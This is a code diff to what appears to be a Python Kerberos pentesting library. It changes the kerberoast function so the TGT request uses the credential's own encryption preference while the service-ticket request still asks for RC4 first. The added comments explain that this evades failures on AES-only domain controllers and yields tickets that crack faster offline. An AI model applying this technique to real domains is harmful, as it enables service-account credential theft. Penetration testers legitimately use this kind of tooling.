@@ -61,15 +61,28 @@ async def krb5userenum(target:KerberosTarget, usernames:List[str], domain:str):
 
 
 async def kerberoast(factory:KerberosClientFactory, usernames:List[str], domain:str, override_etype:List[int] = [23,17,18], cross_domain:bool = False):
+	# override_etype applies to the TGS-REQ (the roasted service ticket), NOT to
+	# the TGT. RC4-first ([23,17,18]) by default so the KDC issues an RC4-encrypted
+	# service ticket ($krb5tgs$23$, ~10x faster to crack than $krb5tgs$18$) when the
+	# service account supports RC4, degrading to AES for AES-only accounts (the KDC
+	# picks the strongest etype the service key supports from the offered list).
+	#
+	# The TGT (authentication only — not the cracked material) deliberately does
+	# NOT inherit this RC4-first list: forcing RC4 on the AS-REQ fails against an
+	# AES-only KDC (RC4 disabled by GPO -> KDC_ERR_ETYPE_NOTSUPP). Pass override_etype
+	# = None so the credential's own preference drives the TGT (AES-first for
+	# password / aes_key), which authenticates everywhere. Decoupling the two is
+	# what lets kerberoasting both (a) authenticate on hardened DCs and (b) still
+	# request the fast-cracking RC4 service ticket.
 	if not isinstance(usernames, list):
 		usernames = [usernames]
 	if not isinstance(override_etype, list):
 		override_etype = [override_etype]
-	
+
 	for username in usernames:
 		try:
 			kcomm = factory.get_client()
-			await kcomm.with_clock_skew(kcomm.get_TGT, override_etype = override_etype)
+			await kcomm.with_clock_skew(kcomm.get_TGT, override_etype = None)
 			spn = KerberosSPN.from_upn('%s@%s' % (username, domain))
 			kcommnew = kcomm
 			if cross_domain is True:
